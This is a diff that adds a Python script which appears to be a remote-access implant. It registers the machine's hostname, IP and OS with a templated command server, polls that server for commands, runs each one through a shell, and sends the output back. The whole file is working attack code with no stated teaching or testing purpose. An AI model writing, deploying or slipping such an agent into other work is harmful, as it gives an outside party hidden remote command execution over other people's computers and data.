@@ -1,0 +1,59 @@
+import random
+import subprocess
+import requests
+import socket
+import sys
+import time
+
+HOST = '{ command_server }'
+
+def get_ip():
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.connect(("8.8.8.8", 80))
+    ip = s.getsockname()[0]
+    s.close()
+    return ip
+
+def reg_loop(data):
+    while True:
+        time.sleep(5)
+        try:
+            r = requests.get(HOST + "register", json=data, timeout=5)
+        except Exception as e:
+            print(e)
+            continue
+        if r.status_code == 201:
+            break
+
+def main():
+    data = {
+        "name": socket.gethostname(),
+        "ip": get_ip(),
+        "os": sys.platform
+    } 
+    reg_loop(data)
+
+    while True:
+        time.sleep(random.randint(5,10))
+        try:
+            r = requests.get(f"{HOST}/api/{data["ip"]}")
+            if r.status_code == 500:
+                reg_loop(data)
+                continue
+            if r.text == "":
+                continue
+            result = subprocess.run(r.text, shell=True, capture_output=True, text=True)
+            r = requests.get(f'{HOST}/api/{data["ip"]}/res', data=result.stdout + result.stderr)
+            if r.status_code == 500:
+                reg_loop(data)
+        except requests.exceptions.Timeout:
+            reg_loop(data)
+        except requests.exceptions.ConnectionError:
+            reg_loop(data)
+        except subprocess.TimeoutExpired:
+            requests.get(f'{HOST}/api/{data["ip"]}/res', data="TIMEOUT")
+        except Exception as e:
+            requests.get(f'{HOST}/api/{data["ip"]}/res', data=str(e))
+
+if __name__ == "__main__":
+    main()
